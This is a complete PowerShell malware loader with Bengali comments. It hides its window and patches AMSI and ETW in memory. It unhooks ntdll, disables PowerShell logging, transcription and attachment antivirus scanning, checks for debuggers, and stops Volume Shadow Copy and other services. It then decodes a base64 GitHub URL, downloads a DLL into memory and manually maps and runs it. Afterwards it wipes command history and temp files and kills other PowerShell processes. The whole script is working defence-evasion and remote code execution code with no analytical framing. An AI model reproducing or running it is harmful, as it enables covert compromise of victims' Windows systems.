# ============================================================
#  ★★★ main.ps1 – সম্পূর্ণ সংস্করণ (মেমরি-অনলি ইনজেকশন সহ) ★★★
# ============================================================

# ============================================================
#  ১. কনসোল উইন্ডো হাইড (সর্বপ্রথম)
# ============================================================
Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@ -ErrorAction SilentlyContinue
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)

# ============================================================
#  ২. সব বাইপাস ফাংশন (message (1).txt থেকে নেওয়া)
# ============================================================

# ২.১ SeDebugPrivilege সক্রিয়করণ
function Enable-SeDebugPrivilege {
    $AdjustTokenPrivileges = @"
using System;
using System.Runtime.InteropServices;

public class TokenManipulator {
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }

    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool LookupPrivilegeValue(
        string lpSystemName,
        string lpName,
        out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        uint Zero,
        IntPtr Null1,
        IntPtr Null2);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@
    try {
        Add-Type -TypeDefinition $AdjustTokenPrivileges -ErrorAction Stop
        $currentProcess = [TokenManipulator]::GetCurrentProcess()
        $tokenHandle = [IntPtr]::Zero
        $tokenPrivileges = New-Object TokenManipulator+TOKEN_PRIVILEGES
        $luid = New-Object TokenManipulator+LUID

        if (-not [TokenManipulator]::OpenProcessToken($currentProcess, 0x28, [ref]$tokenHandle)) { throw }
        if (-not [TokenManipulator]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$luid)) { throw }
        $tokenPrivileges.PrivilegeCount = 1
        $tokenPrivileges.Luid = $luid
        $tokenPrivileges.Attributes = 0x2
        [TokenManipulator]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tokenPrivileges, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
    } catch {}
}

# ২.২ AMSI বাইপাস (প্যাচ)
function Invoke-AMSIBypass {
    try {
        $amsiPatch = @"
using System;
using System.Runtime.InteropServices;

public class AMSIPatch {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Disable() {
        IntPtr hAmsi = LoadLibrary("amsi.dll");
        IntPtr asbAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");
        
        if (asbAddr != IntPtr.Zero) {
            uint oldProtect;
            VirtualProtect(asbAddr, (UIntPtr)5, 0x40, out oldProtect);
            
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(patch, 0, asbAddr, 6);
            
            VirtualProtect(asbAddr, (UIntPtr)5, oldProtect, out oldProtect);
        }
    }
}
"@
        Add-Type -TypeDefinition $amsiPatch -ErrorAction Stop
        [AMSIPatch]::Disable()
    } catch {}
}

# ২.৩ ETW বাইপাস (প্যাচ)
function Invoke-ETWBypass {
    try {
        $etwPatch = @"
using System;
using System.Runtime.InteropServices;

public class ETWPatch {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Disable() {
        IntPtr hNtdll = LoadLibrary("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(hNtdll, "EtwEventWrite");
        
        if (etwAddr != IntPtr.Zero) {
            uint oldProtect;
            VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
            
            byte[] patch = { 0xC3 };
            Marshal.Copy(patch, 0, etwAddr, 1);
            
            VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
        }
    }
}
"@
        Add-Type -TypeDefinition $etwPatch -ErrorAction Stop
        [ETWPatch]::Disable()
    } catch {}
}

# ২.৪ NTDLL আনহুক (ডিস্ক থেকে নতুন কপি)
function Invoke-NTDLLUnhook {
    try {
        $unhookCode = @"
using System;
using System.IO;
using System.Runtime.InteropServices;

public class NTDLLUnhooker {
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

    public static void Unhook() {
        string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
        string ntdllPath = Path.Combine(system32, "ntdll.dll");
        IntPtr hCleanNtdll = LoadLibraryEx(ntdllPath, IntPtr.Zero, 0x00000008);
        if (hCleanNtdll == IntPtr.Zero) return;
        IntPtr hHookedNtdll = GetModuleHandle("ntdll.dll");
        IntPtr peHeader = (IntPtr)((long)hHookedNtdll + 0x3C);
        IntPtr optHeader = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32(peHeader) + 0x18);
        IntPtr exportDir = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)optHeader + 0x70)));
        int numberOfNames = Marshal.ReadInt32((IntPtr)((long)exportDir + 0x18));
        IntPtr namesAddr = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)exportDir + 0x20)));
        for (int i = 0; i < numberOfNames; i++) {
            IntPtr nameAddr = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)namesAddr + i * 4)));
            string funcName = Marshal.PtrToStringAnsi(nameAddr);
            IntPtr hookedAddr = GetProcAddress(hHookedNtdll, funcName);
            IntPtr cleanAddr = GetProcAddress(hCleanNtdll, funcName);
            if (hookedAddr != IntPtr.Zero && cleanAddr != IntPtr.Zero) {
                uint oldProtect;
                if (VirtualProtect(hookedAddr, (UIntPtr)0x20, 0x40, out oldProtect)) {
                    byte[] cleanBytes = new byte[0x20];
                    Marshal.Copy(cleanAddr, cleanBytes, 0, 0x20);
                    Marshal.Copy(cleanBytes, 0, hookedAddr, 0x20);
                    VirtualProtect(hookedAddr, (UIntPtr)0x20, oldProtect, out oldProtect);
                }
            }
        }
    }
}
"@
        Add-Type -TypeDefinition $unhookCode -ErrorAction Stop
        [NTDLLUnhooker]::Unhook()
    } catch {}
}

# ২.৫ ScriptBlock Logging নিষ্ক্রিয়করণ (Event 4104)
function Disable-ScriptBlockLogging {
    try {
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        if (Test-Path $regPath) {
            Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -Force -ErrorAction SilentlyContinue
        } else {
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -PropertyType DWord -Force | Out-Null
        }
        $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
        $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        if ($gpoField) {
            $gpo = $gpoField.GetValue($null)
            if ($gpo -is [Hashtable]) {
                $gpo['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
            } else {
                $gpo = @{ 'ScriptBlockLogging' = @{ 'EnableScriptBlockLogging' = 0 } }
                $gpoField.SetValue($null, $gpo)
            }
        }
    } catch {}
}

# ২.৬ Transcription নিষ্ক্রিয়করণ
function Disable-Transcription {
    try {
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
        if (Test-Path $regPath) {
            Set-ItemProperty -Path $regPath -Name "EnableTranscripting" -Value 0 -Force -ErrorAction SilentlyContinue
        } else {
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "EnableTranscripting" -Value 0 -PropertyType DWord -Force | Out-Null
        }
    } catch {}
}

# ২.৭ অ্যান্টি-ডিবাগ (ঐচ্ছিক)
function Test-Debugger {
    try {
        if ([System.Diagnostics.Debugger]::IsAttached) { exit }
        $process = Get-Process -Id $pid
        $debuggers = @("*\idaq.exe", "*\ollydbg.exe", "*\windbg.exe", "*\x32dbg.exe", "*\x64dbg.exe")
        $sandboxPaths = @("C:\sample.exe", "C:\malware.exe", "C:\analysis\")
        foreach ($path in $sandboxPaths) {
            if (Test-Path $path) { exit }
        }
    } catch {}
}

# ============================================================
#  ৩. সব বাইপাস কার্যকর করা
# ============================================================
Enable-SeDebugPrivilege
Test-Debugger
Invoke-AMSIBypass
Invoke-ETWBypass
Invoke-NTDLLUnhook
Disable-ScriptBlockLogging
Disable-Transcription

# ============================================================
#  ৪. মূল main.ps1-এর সার্ভিস ও রেজিস্ট্রি কাজ
# ============================================================
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

# ============================================================
#  ৫. মেমরি-অনলি DLL ইনজেকশন (এনক্রিপ্টেড URL + ম্যানুয়াল ম্যাপিং)
#  ─── ($discordRunning অংশ বাদ, কোনো ডিস্ক লেখা নেই) ───
# ============================================================

# ৫.১ সি# ম্যানুয়াল লোডার (NativeLoader)
$kernel = @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class ManualMapResult { public IntPtr ImageBase; public uint ImageSize; public IntPtr DllMainAddr; public long Delta; public bool Is64Bit; }
public static class NativeLoader {
    [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
    [DllImport("kernel32.dll", SetLastError = true)] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, IntPtr o);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetModuleHandleA(string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32.dll")] static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    const uint MC = 0x1000, MR = 0x2000, MF = 0x8000, PRW = 0x04, PER = 0x20, PERW = 0x40, PRO = 0x02;
    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
    static uint U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    static ulong U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }
    static uint RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); }
    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o)); }
    static ulong RU64(IntPtr p, long o) { long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o+4)); return (ulong)((hi<<32)|lo); }
    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64()+o),(long)v); }
    static void WU32(IntPtr p, long o, uint v) { Marshal.WriteInt32((IntPtr)(p.ToInt64()+o),(int)v); }
    static string RAscii(IntPtr p, long o) { var sb = new StringBuilder(); for (int i=0;i<260;i++) { byte b=Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i)); if(b==0)break; sb.Append((char)b); } return sb.ToString(); }
    static uint SProt(uint c) { bool x=(c&0x20000000)!=0, w=(c&0x80000000)!=0, r=(c&0x40000000)!=0; if(x&&w) return PERW; if(x&&r) return PER; if(x) return PER; if(w) return PRW; return PRO; }
    struct Sec { public uint VS,VA,SRD,PRD,Ch; }
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool DllMainFn(IntPtr h, uint r, IntPtr p);
    public static ManualMapResult Map(byte[] dll, bool callEntry) {
        var res = new ManualMapResult();
        if(U16(dll,0)!=0x5A4D) throw new Exception("Invalid MZ");
        int lfa = BitConverter.ToInt32(dll,0x3C); if(U32(dll,lfa)!=0x4550u) throw new Exception("Invalid PE");
        int co=lfa+4; ushort ns=U16(dll,co+2), ohs=U16(dll,co+16); int oo=co+20; bool is64=(U16(dll,oo)==0x020B); res.Is64Bit=is64;
        uint ep=U32(dll,oo+16), soi=U32(dll,oo+56), soh=U32(dll,oo+60); ulong ib=is64?U64(dll,oo+24):U32(dll,oo+28); res.ImageSize=soi;
        int dd=is64?oo+112:oo+96; uint irva=U32(dll,dd+8), rrva=U32(dll,dd+40), rsz=U32(dll,dd+44);
        int st=oo+ohs; var secs=new Sec[ns]; for(int i=0;i<ns;i++){int b=st+i*40;secs[i]=new Sec{VS=U32(dll,b+8),VA=U32(dll,b+12),SRD=U32(dll,b+16),PRD=U32(dll,b+20),Ch=U32(dll,b+36)};}
        IntPtr img=VirtualAlloc(IntPtr.Zero,(UIntPtr)soi,MC|MR,PRW); if(img==IntPtr.Zero) throw new Exception("VirtualAlloc failed");
        res.ImageBase=img; long ab=img.ToInt64(), delta=ab-(long)ib; res.Delta=delta;
        Marshal.Copy(dll,0,img,(int)soh);
        foreach(var s in secs){ if(s.SRD==0) continue; uint cs=s.VS==0?s.SRD:Math.Min(s.SRD,s.VS); if(s.PRD+cs>(uint)dll.Length){cs=(uint)dll.Length-s.PRD; if(cs==0)continue;} Marshal.Copy(dll,(int)s.PRD,(IntPtr)(ab+s.VA),(int)cs); }
        if(rrva!=0&&delta!=0){ uint ro=rrva, re=rrva+rsz; while(ro<re){ uint pg=RU32(img,ro), bs=RU32(img,ro+4); if(bs==0)break; int ne=(int)(bs-8)/2; for(int i=0;i<ne;i++){ ushort e=RU16(img,ro+8+i*2); int ty=(e>>12)&0xF, of=e&0xFFF; if(ty==0)continue; long tr=pg+of; if(ty==10){ulong c=RU64(img,tr);WU64(img,tr,(ulong)((long)c+delta));} else if(ty==3){uint c=RU32(img,tr);WU32(img,tr,(uint)((long)c+delta));} } ro+=bs; } }
        if(irva!=0){ int ie=0; while(true){ long eo=irva+ie*20; uint nr=RU32(img,eo+12),ir=RU32(img,eo+16),inr=RU32(img,eo); if(nr==0)break; string dn=RAscii(img,nr); IntPtr hd=GetModuleHandleA(dn); if(hd==IntPtr.Zero) hd=LoadLibraryA(dn); if(hd==IntPtr.Zero){ie++;continue;} long to=0; uint tb=inr!=0?inr:ir; int ts=is64?8:4; while(true){ long te=tb+to; long tv=is64?(long)RU64(img,te):(long)RU32(img,te); if(tv==0)break; long of=is64?unchecked((long)0x8000000000000000L):(long)0x80000000; IntPtr fa=IntPtr.Zero; if((tv&of)!=0) fa=GetProcAddress(hd,(IntPtr)(int)(tv&0xFFFF)); else fa=GetProcAddress(hd,RAscii(img,tv+2)); if(fa!=IntPtr.Zero){ IntPtr ia=(IntPtr)(ab+ir+to); if(is64) Marshal.WriteInt64(ia,fa.ToInt64()); else Marshal.WriteInt32(ia,fa.ToInt32()); } to+=ts; } ie++; } }
        foreach(var s in secs){ uint sz=Math.Max(s.VS,s.SRD); if(sz==0)continue; uint op; VirtualProtect((IntPtr)(ab+s.VA),(UIntPtr)sz,SProt(s.Ch),out op); }
        FlushInstructionCache(GetCurrentProcess(),img,(UIntPtr)soi);
        res.DllMainAddr=IntPtr.Zero; if(callEntry&&ep!=0){ res.DllMainAddr=(IntPtr)(ab+ep); try{var fn=(DllMainFn)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr,typeof(DllMainFn));fn(img,1,IntPtr.Zero);} catch{} }
        return res;
    }
    public static bool Free(IntPtr b) { return VirtualFree(b,UIntPtr.Zero,MF); }
}
'@

try {
    Add-Type -TypeDefinition $kernel -ErrorAction Stop
} catch {
    # ব্যর্থ হলে নীরব থাকুন (কিন্তু ইনজেকশন চলবে না)
}

# ৫.২ এনক্রিপ্টেড URL ডিকোড ও DLL ডাউনলোড (মেমরিতে)
$EncodedDllUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
try {
    $decodedUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedDllUrl))
    $bytes = (New-Object System.Net.WebClient).DownloadData($decodedUrl)
} catch {
    $bytes = $null
}

# ৫.৩ ম্যানুয়াল ম্যাপিং (ইনজেকশন)
if ($bytes) {
    try {
        $result = [NativeLoader]::Map($bytes, $true)
        # সফল হলে কোনো আউটপুট দেখাবে না (নীরব)
    } catch {}
    $bytes = $null
}

# ============================================================
#  ৬. ইতিহাস ও টেম্প ফাইল ক্লিয়ার (পূর্বের মতো)
# ============================================================
Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
}

Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.Parent.Id -ne $PID) {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (-not (Test-Path $historyPath)) {
    New-Item -Path $historyPath -ItemType File -Force | Out-Null
} else {
    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
}

# টেম্প ফাইল ক্লিয়ার (গত ২ মিনিট)
Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue

# ভেরিয়েবল ক্লিয়ার
$kernel = $null
[GC]::Collect(); [GC]::WaitForPendingFinalizers()

# ============================================================
#  ৭. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে)
# ============================================================
while ($true) {
    Start-Sleep -Seconds 86400
}
